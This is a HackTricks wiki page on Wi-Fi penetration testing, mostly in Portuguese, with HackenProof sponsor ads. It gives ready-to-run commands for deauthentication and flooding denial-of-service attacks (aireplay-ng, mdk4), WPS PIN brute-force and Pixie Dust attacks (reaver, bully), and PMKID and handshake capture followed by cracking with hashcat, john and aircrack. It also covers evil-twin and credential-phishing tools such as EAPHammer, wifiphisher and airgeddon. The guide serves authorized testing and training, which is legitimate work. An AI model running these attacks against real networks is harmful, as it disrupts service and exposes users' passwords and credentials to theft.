# Pentesting Wifi

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando seus clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Comandos b√°sicos do Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
### EAPHammer

EAPHammer is a toolkit designed for performing targeted evil twin attacks against WPA2-Enterprise networks. It is built on top of the hostapd-wpe project and uses the hostapd-mana framework for creating the rogue access point.

#### Installation

To install EAPHammer, follow these steps:

1. Clone the EAPHammer repository from GitHub:

   ```
   git clone https://github.com/s0lst1c3/eaphammer.git
   ```

2. Change into the EAPHammer directory:

   ```
   cd eaphammer
   ```

3. Run the installation script:

   ```
   ./kali-setup
   ```

#### Usage

To use EAPHammer, follow these steps:

1. Start EAPHammer:

   ```
   ./eaphammer
   ```

2. Select the target network from the list of available networks.

3. Choose the attack mode (e.g., Evil Twin, Credential Harvester, etc.).

4. Follow the on-screen instructions to complete the attack.

For more information on how to use EAPHammer, refer to the [official documentation](https://github.com/s0lst1c3/eaphammer/wiki).

#### Disclaimer

EAPHammer is a powerful tool that can be used for both legitimate and malicious purposes. It is important to obtain proper authorization before using this tool and to use it responsibly and ethically. The author of EAPHammer is not responsible for any misuse or damage caused by this tool.
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon is a multi-purpose tool designed for wireless penetration testing. It provides a comprehensive set of features and functionalities to assess the security of Wi-Fi networks. With Airgeddon, you can perform various attacks, such as deauthentication, fake access point creation, and password cracking.

#### Features

- **Deauthentication**: Airgeddon can send deauthentication frames to disconnect clients from a Wi-Fi network, allowing you to perform man-in-the-middle attacks or capture handshake packets.

- **Fake Access Point**: This tool can create a fake access point to trick clients into connecting to it. This enables you to intercept their traffic and perform further attacks.

- **Password Cracking**: Airgeddon supports various password cracking techniques, including dictionary attacks, WPS attacks, and brute-force attacks. It can also leverage external tools like Aircrack-ng and Hashcat for more advanced cracking methods.

- **Evil Twin Attack**: With Airgeddon, you can set up an evil twin access point that mimics a legitimate network. This allows you to capture sensitive information, such as login credentials, from unsuspecting users.

- **Wireless Survey**: This tool provides a wireless survey mode that allows you to gather information about nearby Wi-Fi networks, including their SSIDs, signal strength, and encryption types.

- **Integration with Other Tools**: Airgeddon integrates with various other tools, such as Aircrack-ng, MDK3, and Wifite, to enhance its capabilities and provide a more comprehensive testing environment.

#### Usage

To use Airgeddon, you need a compatible wireless network adapter that supports monitor mode and packet injection. Once you have the necessary hardware, you can download and run Airgeddon on your preferred Linux distribution.

For detailed instructions on how to install and use Airgeddon, refer to the [official documentation](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki).

**Note**: It is important to use Airgeddon responsibly and only on networks that you have permission to test. Unauthorized use of this tool is illegal and unethical.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Executar o airgeddon com docker**

O airgeddon √© uma ferramenta de teste de penetra√ß√£o Wi-Fi que pode ser executada em um ambiente Docker para facilitar a instala√ß√£o e configura√ß√£o. O Docker √© uma plataforma de virtualiza√ß√£o leve que permite empacotar aplicativos em cont√™ineres isolados.

Para executar o airgeddon com o Docker, siga as etapas abaixo:

1. Certifique-se de ter o Docker instalado em seu sistema. Voc√™ pode encontrar instru√ß√µes de instala√ß√£o para o seu sistema operacional no site oficial do Docker.

2. Clone o reposit√≥rio do airgeddon do GitHub para o seu sistema:

   ```
   git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
   ```

3. Navegue at√© o diret√≥rio do airgeddon:

   ```
   cd airgeddon
   ```

4. Construa a imagem Docker usando o arquivo Dockerfile fornecido:

   ```
   docker build -t airgeddon .
   ```

5. Execute o airgeddon dentro de um cont√™iner Docker:

   ```
   docker run -it --net=host --privileged airgeddon
   ```

   O uso da op√ß√£o `--net=host` permite que o cont√™iner acesse a interface de rede do host, o que √© necess√°rio para realizar testes de penetra√ß√£o Wi-Fi.

Agora voc√™ pode usar o airgeddon dentro do cont√™iner Docker para realizar testes de penetra√ß√£o em redes Wi-Fi. Certifique-se de seguir todas as leis e regulamentos aplic√°veis ao realizar testes de penetra√ß√£o.
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
De: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Ele pode realizar ataques de Evil Twin, KARMA e Beacons Conhecidos e, em seguida, usar um modelo de phishing para obter a senha real da rede ou capturar credenciais de redes sociais.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta ferramenta automatiza ataques **WPS/WEP/WPA-PSK**. Ela ir√° automaticamente:

* Configurar a interface em modo de monitoramento
* Escanear poss√≠veis redes - E permitir que voc√™ selecione a(s) v√≠tima(s)
* Se for WEP - Lan√ßar ataques WEP
* Se for WPA-PSK
* Se for WPS: Ataque Pixie dust e ataque de for√ßa bruta (tenha cuidado, o ataque de for√ßa bruta pode levar muito tempo). Observe que ele n√£o tenta PIN nulo ou PINs gerados do banco de dados.
* Tentar capturar o PMKID do AP para quebr√°-lo
* Tentar desautenticar clientes do AP para capturar um handshake
* Se tiver PMKID ou Handshake, tentar for√ßa bruta usando as 5000 senhas mais comuns.

## Resumo dos Ataques

* **DoS**
* Pacotes de desautentica√ß√£o/desassocia√ß√£o -- Desconectar todos (ou um ESSID/Cliente espec√≠fico)
* APs falsos aleat√≥rios -- Ocultar redes, poss√≠veis scanners de falhas
* Sobrecarregar AP -- Tentar derrubar o AP (geralmente n√£o √© muito √∫til)
* WIDS -- Brincar com o IDS
* TKIP, EAPOL -- Alguns ataques espec√≠ficos para DoS em alguns APs
* **Quebra de Senha**
* Quebrar **WEP** (v√°rias ferramentas e m√©todos)
* **WPA-PSK**
* **WPS** pin "For√ßa Bruta"
* **WPA PMKID** for√ßa bruta
* \[DoS +] Captura de **handshake WPA** + Quebra de senha
* **WPA-MGT**
* Captura de **nome de usu√°rio**
* **For√ßa Bruta** de credenciais
* **Evil Twin** (com ou sem DoS)
* **Evil Twin** aberto \[+ DoS] -- √ötil para capturar credenciais de portal cativo e/ou realizar ataques de LAN
* **Evil Twin** WPA-PSK -- √ötil para ataques de rede se voc√™ souber a senha
* **WPA-MGT** -- √ötil para capturar credenciais da empresa
* **KARMA, MANA**, **Loud MANA**, **Beacon conhecido**
* **+ Aberto** -- √ötil para capturar credenciais de portal cativo e/ou realizar ataques de LAN
* **+ WPA** -- √ötil para capturar handshakes WPA

## DoS

### Pacotes de Desautentica√ß√£o

A forma mais comum desse tipo de ataque √© atrav√©s de pacotes de **desautentica√ß√£o**. Estes s√£o um tipo de quadro "gerenciamento" respons√°vel por desconectar um dispositivo de um ponto de acesso. Forjar esses pacotes √© a chave para [hackear muitas redes Wi-Fi](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/), pois voc√™ pode desconectar for√ßadamente qualquer cliente da rede a qualquer momento. A facilidade com que isso pode ser feito √© um tanto assustadora e muitas vezes √© feito como parte da coleta de um handshake WPA para quebrar.

Al√©m de usar momentaneamente essa desconex√£o para obter um handshake para quebrar, voc√™ tamb√©m pode deixar essas desautentica√ß√µes continuarem, o que tem o efeito de enviar pacotes de desautentica√ß√£o para o cliente aparentemente da rede √† qual est√£o conectados. Como esses quadros n√£o s√£o criptografados, muitos programas se aproveitam dos quadros de gerenciamento, forjando-os e enviando-os para um ou todos os dispositivos em uma rede.\
**Descri√ß√£o retirada da** [**qui**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Desautentica√ß√£o usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 significa desautentica√ß√£o
* 1 √© o n√∫mero de desautentica√ß√µes a serem enviadas (voc√™ pode enviar v√°rias se desejar); 0 significa envi√°-las continuamente
* \-a 00:14:6C:7E:40:80 √© o endere√ßo MAC do ponto de acesso
* \-c 00:0F:B5:34:30:30 √© o endere√ßo MAC do cliente a ser desautenticado; se isso for omitido, ser√° enviada uma desautentica√ß√£o de transmiss√£o (nem sempre funciona)
* ath0 √© o nome da interface

### Pacotes de Desassocia√ß√£o

Pacotes de desassocia√ß√£o s√£o outro tipo de quadro de gerenciamento que √© usado para desconectar um n√≥ (ou seja, qualquer dispositivo como um laptop ou celular) de um ponto de acesso pr√≥ximo. A diferen√ßa entre os quadros de desautentica√ß√£o e desassocia√ß√£o √© principalmente a forma como s√£o usados.

Um ponto de acesso que deseja desconectar um dispositivo n√£o autorizado enviaria um pacote de desautentica√ß√£o para informar o dispositivo de que ele foi desconectado da rede, enquanto um pacote de desassocia√ß√£o √© usado para desconectar quaisquer n√≥s quando o ponto de acesso est√° desligando, reiniciando ou saindo da √°rea.

**Descri√ß√£o retirada** [**aqui**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Esse ataque pode ser realizado pelo mdk4 (modo "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mais ataques de DOS por mdk4**

**De** [**aqui**](https://en.kali.tools/?p=864)**.**

**MODO DE ATAQUE b: Beacon Flooding**

Envia quadros de beacon para mostrar APs falsos aos clientes. Isso √†s vezes pode travar scanners de rede e at√© mesmo drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODO DE ATAQUE a: Negativa de Servi√ßo de Autentica√ß√£o**

Envia quadros de autentica√ß√£o para todos os APs encontrados na √°rea. Muitos clientes podem congelar ou reiniciar v√°rios APs.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODO DE ATAQUE p: Sondagem de SSID e For√ßa Bruta**

Sonda os APs e verifica se h√° resposta, √∫til para verificar se o SSID foi decloakado corretamente e se o AP est√° dentro do seu alcance de envio. A **for√ßa bruta de SSIDs ocultos** com ou sem uma lista de palavras tamb√©m est√° dispon√≠vel.

**MODO DE ATAQUE m: Explora√ß√£o de Contramedidas Michael**

Envia pacotes aleat√≥rios ou reinjeta duplicatas em outra fila de QoS para provocar as Contramedidas Michael em APs **TKIP**. O AP ent√£o desligar√° por um minuto inteiro, tornando isso um **DoS** efetivo.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODO DE ATAQUE e: Inje√ß√£o de Pacotes EAPOL Start e Logoff**

Inunda um AP com quadros de in√≠cio **EAPOL** para mant√™-lo ocupado com **sess√µes falsas** e, assim, desabilit√°-lo para lidar com clientes leg√≠timos. Ou desconecta clientes **injetando mensagens falsas** de Logoff EAPOL.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODO DE ATAQUE s: Ataques para redes mesh IEEE 802.11s**

V√°rios ataques √† gest√£o de links e roteamento em redes mesh. Inundar vizinhos e rotas, criar buracos negros e desviar o tr√°fego!

**MODO DE ATAQUE w: Confus√£o de WIDS**

Confundir/abusar de Sistemas de Detec√ß√£o e Preven√ß√£o de Intrus√µes, conectando clientes a v√°rios n√≥s WDS ou a falsos APs rogue.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODO DE ATAQUE f: Fuzzer de Pacotes**

Um fuzzer de pacotes simples com v√°rias fontes de pacotes e um conjunto interessante de modificadores. Tenha cuidado!

### **Airggedon**

_**Airgeddon**_ oferece a maioria dos ataques propostos nos coment√°rios anteriores:

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS significa Wi-Fi Protected Setup. √â um padr√£o de seguran√ßa de rede sem fio que tenta tornar as conex√µes entre um roteador e dispositivos sem fio mais r√°pidas e f√°ceis. **O WPS funciona apenas para redes sem fio que usam uma senha** que √© criptografada com os protocolos de seguran√ßa **WPA** Personal ou **WPA2** Personal. O WPS n√£o funciona em redes sem fio que est√£o usando a seguran√ßa WEP obsoleta, que pode ser facilmente quebrada por qualquer hacker com um conjunto b√°sico de ferramentas e habilidades. (De [aqui](https://www.digitalcitizen.life/simple-questions-what-wps-wi-fi-protected-setup))

O WPS usa um PIN de 8 d√≠gitos para permitir que um usu√°rio se conecte √† rede, mas primeiro s√£o verificados os primeiros 4 n√∫meros e, se estiverem corretos, ent√£o s√£o verificados os segundos 4 n√∫meros. Assim, √© poss√≠vel fazer um ataque de for√ßa bruta na primeira metade e depois na segunda metade (apenas 11000 possibilidades).

### For√ßa Bruta WPS

Existem 2 ferramentas principais para realizar essa a√ß√£o: Reaver e Bully.

* **Reaver** foi projetado para ser um ataque robusto e pr√°tico contra o WPS e foi testado em uma ampla variedade de pontos de acesso e implementa√ß√µes do WPS.
* **Bully** √© uma **nova implementa√ß√£o** do ataque de for√ßa bruta do WPS, escrita em C. Ele possui v√°rias vantagens em rela√ß√£o ao c√≥digo original do reaver: menos depend√™ncias, melhor desempenho de mem√≥ria e CPU, manipula√ß√£o correta de endianness e um conjunto mais robusto de op√ß√µes.

Esse ataque aproveita uma **vulnerabilidade no c√≥digo PIN WPS de oito d√≠gitos**; devido a esse problema, o protocolo **revela informa√ß√µes sobre os quatro primeiros d√≠gitos do PIN**, e o **√∫ltimo** d√≠gito funciona como um **checksum**, o que facilita a for√ßa bruta do AP WPS.\
Observe que alguns dispositivos incluem **prote√ß√µes contra for√ßa bruta**, que geralmente **bloqueiam endere√ßos MAC** que tentam atacar repetidamente. Nesse caso, a complexidade desse ataque aumenta, pois voc√™ teria que **rotacionar os endere√ßos MAC** enquanto testa os PINs.

Se o c√≥digo WPS v√°lido for encontrado, tanto o Bully quanto o Reaver o usar√£o para descobrir o PSK WPA/WPA2 usado para proteger a rede, para que voc√™ possa se conectar sempre que precisar.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute force**

Em vez de come√ßar a tentar todos os PINs poss√≠veis, voc√™ deve verificar se existem **PINs descobertos para o AP que voc√™ est√° atacando** (dependendo do MAC do fabricante) e os **PINs gerados pelo software**.

* O banco de dados de PINs conhecidos √© feito para Access Points de certos fabricantes, nos quais √© sabido que eles usam os mesmos PINs WPS. Este banco de dados cont√©m os tr√™s primeiros octetos dos endere√ßos MAC e uma lista de PINs correspondentes que s√£o muito prov√°veis para este fabricante.
* Existem v√°rios algoritmos para gerar PINs WPS. Por exemplo, ComputePIN e EasyBox usam o endere√ßo MAC do Access Point em seus c√°lculos. Mas o algoritmo Arcadyan tamb√©m requer um ID de dispositivo.

### Ataque WPS Pixie Dust

Dominique Bongard descobriu que alguns APs t√™m maneiras fracas de gerar **nonces** (conhecidos como **E-S1** e **E-S2**) que devem ser secretos. Se formos capazes de descobrir quais s√£o esses nonces, podemos facilmente encontrar o PIN WPS de um AP, pois o AP deve nos fornec√™-lo em um hash para provar que ele tamb√©m conhece o PIN, e o cliente n√£o est√° se conectando a um AP falso. Esses E-S1 e E-S2 s√£o essencialmente as "chaves para desbloquear a caixa de fechadura" que cont√©m o PIN WPS. Mais informa√ß√µes aqui: [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))

Basicamente, algumas implementa√ß√µes falharam no uso de chaves aleat√≥rias para criptografar as 2 partes do PIN (pois ele √© descomposto em 2 partes durante a comunica√ß√£o de autentica√ß√£o e enviado ao cliente), ent√£o um ataque offline pode ser usado para for√ßar bruta o PIN v√°lido.
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Ataque Null Pin

Algumas implementa√ß√µes realmente ruins permitem a conex√£o com o Null PIN (muito estranho tamb√©m). O Reaver pode testar isso (o Bully n√£o pode).
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos os ataques WPS propostos podem ser facilmente realizados usando o _**airgeddon**._

![](<../../.gitbook/assets/image (124).png>)

* 5 e 6 permitem que voc√™ tente **seu PIN personalizado** (se voc√™ tiver algum)
* 7 e 8 realizam o ataque **Pixie Dust**
* 13 permite que voc√™ teste o **PIN NULL**
* 11 e 12 ir√£o **coletar os PINs relacionados ao AP selecionado a partir de bancos de dados dispon√≠veis** e **gerar** poss√≠veis **PINs** usando: ComputePIN, EasyBox e opcionalmente Arcadyan (recomendado, por que n√£o?)
* 9 e 10 testar√£o **todos os PINs poss√≠veis**

## **WEP**

T√£o quebrado e desaparecido que n√£o vou falar sobre isso. Apenas saiba que o _**airgeddon**_ tem uma op√ß√£o WEP chamada "All-in-One" para atacar esse tipo de prote√ß√£o. Mais ferramentas oferecem op√ß√µes semelhantes.

![](<../../.gitbook/assets/image (125).png>)

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento da recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda dos hackers web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## WPA/WPA2 PSK

### PMKID

Em 2018, os autores do hashcat [divulgaram](https://hashcat.net/forum/thread-7717.html) um novo tipo de ataque que n√£o apenas depende **de um √∫nico pacote**, mas tamb√©m n√£o requer que nenhum cliente esteja conectado ao nosso AP de destino, apenas a comunica√ß√£o entre o atacante e o AP.

Acontece que **muitos** roteadores modernos adicionam um **campo opcional** no final do **primeiro quadro EAPOL** enviado pelo pr√≥prio AP quando algu√©m est√° se associando, chamado `Rede de Seguran√ßa Robusta`, que inclui algo chamado `PMKID`.

Conforme explicado na postagem original, o **PMKID** √© derivado usando dados que s√£o conhecidos por n√≥s:
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
**Uma vez que a string "PMK Name" √© constante, sabemos tanto o BSSID do AP quanto da esta√ß√£o e o `PMK` √© o mesmo obtido a partir de um handshake completo de 4 vias**, isso √© tudo o que o hashcat precisa para quebrar a PSK e recuperar a senha!\
Descri√ß√£o obtida [aqui](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/).

Para **coletar** essas informa√ß√µes e **fazer for√ßa bruta** localmente na senha, voc√™ pode fazer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Os **PMKIDs capturados** ser√£o mostrados no **console** e tamb√©m **salvos** dentro de \_ **/tmp/attack.pcap**\_\
Agora, converta a captura para o formato do **hashcat/john** e quebre-o:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Por favor, observe que o formato de um hash correto cont√©m **4 partes**, como: _4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7\*566f6461666f6e65436f6e6e6563743034383131343838_\
\_\_Se o seu cont√©m **apenas** **3 partes**, ent√£o ele √© **inv√°lido** (a captura PMKID n√£o foi v√°lida).

Observe que o `hcxdumptool` **tamb√©m captura handshakes** (algo como isso aparecer√°: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Voc√™ pode **transformar** os **handshakes** para o formato do **hashcat**/**john** usando o `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
### Captura de Handshake

Uma maneira de atacar redes **WPA/WPA2** √© capturando um **handshake** e tentando **quebrar** a senha usada **offline**. Para fazer isso, voc√™ precisa encontrar o **BSSID** e o **canal** da rede da **v√≠tima**, e um **cliente** que esteja conectado √† rede.\
Uma vez que voc√™ tenha essas informa√ß√µes, voc√™ precisa come√ßar a **escutar** toda a comunica√ß√£o desse **BSSID** nesse **canal**, pois esperan√ßosamente o handshake ser√° enviado l√°:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Agora voc√™ precisa **desautenticar** o **cliente** por alguns segundos para que ele se autentique novamente automaticamente no AP (por favor, leia a parte sobre DoS para encontrar v√°rias maneiras de desautenticar um cliente):
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work
```
_Nota que, como o cliente foi desconectado, ele pode tentar se conectar a um AP diferente ou, em outros casos, a uma rede diferente._

Assim que o `airodump-ng` mostrar algumas informa√ß√µes de handshake, isso significa que o handshake foi capturado e voc√™ pode parar de ouvir:

![](<../../.gitbook/assets/image (172) (1).png>)

Uma vez que o handshake √© capturado, voc√™ pode **quebr√°-lo** com o `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar se h√° handshake no arquivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark** √© uma ferramenta de linha de comando que faz parte do conjunto de ferramentas Wireshark. √â usado para capturar e analisar o tr√°fego de rede em tempo real. O tshark permite visualizar e filtrar pacotes de dados capturados, extraindo informa√ß√µes √∫teis para an√°lise e solu√ß√£o de problemas de rede. Ele suporta uma ampla variedade de formatos de captura e pode ser executado em v√°rias plataformas, incluindo Windows, Linux e macOS. O tshark √© uma ferramenta poderosa para pentesters e administradores de rede que desejam examinar o tr√°fego de rede em detalhes.
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty) √© uma ferramenta de linha de comando usada para quebrar senhas de redes Wi-Fi protegidas pelo protocolo WPA/WPA2. Ele utiliza o m√©todo de ataque de for√ßa bruta para testar v√°rias combina√ß√µes de senhas at√© encontrar a correta. O cowpatty √© altamente eficiente e pode ser usado para testar a seguran√ßa de redes Wi-Fi.
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se esta ferramenta encontrar um handshake incompleto de um ESSID antes do completo, ela n√£o detectar√° o v√°lido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

√â importante falar sobre os **diferentes m√©todos de autentica√ß√£o** que podem ser usados por um Wifi empresarial. Para esse tipo de Wifi, voc√™ provavelmente encontrar√° algo como isso no `airodump-ng`:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
**EAP** (Extensible Authentication Protocol) √© o **esqueleto** da **comunica√ß√£o de autentica√ß√£o**, sobre o qual um algoritmo de autentica√ß√£o √© usado pelo servidor para autenticar o **cliente** (**suplicante**) e, em alguns casos, pelo cliente para autenticar o servidor.\
Os principais algoritmos de autentica√ß√£o usados nesse caso s√£o:

* **EAP-GTC:** √â um m√©todo EAP para suportar o uso de tokens de hardware e senhas √∫nicas com EAP-PEAP. Sua implementa√ß√£o √© semelhante ao MSCHAPv2, mas n√£o usa um desafio entre pares. Em vez disso, as senhas s√£o enviadas para o ponto de acesso em **texto simples** (muito interessante para ataques de degrada√ß√£o).
* **EAP-MD-5 (Message Digest)**: O cliente envia o hash MD5 da senha. **N√£o recomendado**: Vulner√°vel a ataques de dicion√°rio, sem autentica√ß√£o do servidor e sem maneira de gerar chaves de privacidade equivalentes com fio (WEP) por sess√£o.
* **EAP-TLS (Transport Layer Security)**: Ele depende de **certificados do lado do cliente e do servidor** para realizar a autentica√ß√£o e pode ser usado para gerar dinamicamente chaves WEP baseadas em usu√°rio e sess√£o para garantir comunica√ß√µes subsequentes.
* **EAP-TTLS (Tunneled Transport Layer Security)**: **Autentica√ß√£o m√∫tua** do cliente e da rede por meio de um canal (ou t√∫nel) criptografado, bem como um meio de derivar chaves WEP din√¢micas por usu√°rio e por sess√£o. Ao contr√°rio do EAP-TLS, **o EAP-TTLS requer apenas certificados do lado do servidor (o cliente usar√° credenciais)**.
* **PEAP (Protected Extensible Authentication Protocol)**: O PEAP √© como o protocolo **EAP**, mas cria um **t√∫nel TLS** para proteger a comunica√ß√£o. Em seguida, protocolos de autentica√ß√£o fracos podem ser usados em cima do EAP, pois eles ser√£o protegidos pelo t√∫nel.
* **PEAP-MSCHAPv2**: Tamb√©m √© conhecido como apenas **PEAP** porque √© amplamente adotado. Este √© apenas o desafio/resposta vulner√°vel chamado MSCHAPv2 em cima do PEAP (√© protegido pelo t√∫nel TLS).
* **PEAP-EAP-TLS ou apenas PEAP-TLS**: √â muito semelhante ao **EAP-TLS**, mas um t√∫nel TLS √© criado antes da troca de certificados.

